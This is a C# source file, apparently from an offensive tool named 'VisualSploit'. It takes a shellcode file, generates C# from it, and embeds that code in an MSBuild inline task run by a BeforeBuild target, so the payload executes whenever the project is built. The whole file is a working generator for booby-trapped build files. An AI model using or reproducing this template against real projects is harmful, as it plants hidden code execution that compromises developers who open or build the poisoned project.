using VisualSploit.Core;

namespace VisualSploit.Templates;

internal static class MsBuild
{
    public static string Wrap(string shellcodePath, Config cfg)
    {
        var sc = Shellcode.Parse(shellcodePath);
        var code = Generator.Generate(sc, cfg);

        return $$"""
            <UsingTask TaskName="InlineCode" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
              <Task>
                <Code Type="Fragment" Language="cs">
                <![CDATA[
            {{code}}
                ]]>
                </Code>
              </Task>
            </UsingTask>
            <Target Name="BeforeBuild">
              <InlineCode/>
            </Target>
            """;
    }
}
